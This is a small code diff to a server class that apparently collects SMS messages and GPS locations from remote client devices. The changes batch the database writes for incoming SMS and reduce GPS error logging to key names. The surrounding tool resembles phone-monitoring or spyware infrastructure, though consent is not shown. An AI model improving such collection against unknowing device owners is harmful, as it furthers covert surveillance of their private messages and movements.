@@ -264,10 +264,11 @@ class Clients {
                     if (dbSMS.find({ hash }).value() === undefined) {
                         // cool, we dont have this sms
                         sms.hash = hash;
-                        dbSMS.push(sms).write();
+                        dbSMS.push(sms);
                         newCount++; // Patch 6: Increment counter
                     }
                 });
+                if (newCount > 0) dbSMS.write(); // Batch write
                 logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
             }
         });
@@ -324,7 +325,7 @@ class Clients {
                 logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
             } else {
                 logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
-                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
+                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA keys=" + Object.keys(data || {}).join(','));
             }
         });
 
